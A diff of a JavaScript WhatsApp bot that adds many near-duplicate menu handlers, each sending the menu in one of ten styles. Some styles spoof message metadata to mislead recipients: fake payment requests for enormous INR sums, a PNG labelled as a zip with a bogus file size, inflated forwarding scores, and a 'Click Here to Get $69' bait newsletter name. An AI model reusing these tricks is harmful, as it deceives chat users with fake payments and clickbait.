+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }
+      }, {
+                        quoted: m
+                    })
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
+}
+break
+case 'storemenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${storemenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }
+      }, {
+                        quoted: m
+                    })
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'aimenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${aimenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${aimenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -9178,7 +11455,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -9224,7 +11501,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -9233,18 +11510,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
-case 'bugmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-   │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${bugmenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+case 'religionmenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${religionmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -9295,7 +11659,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -9341,7 +11705,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -9350,7 +11714,502 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
+}
+break
+case 'listmenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${listmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }
+      }, {
+                        quoted: m
+                    })
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
+}
+break
+case 'convertmenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${convertmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }
+      }, {
+                        quoted: m
+                    })
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
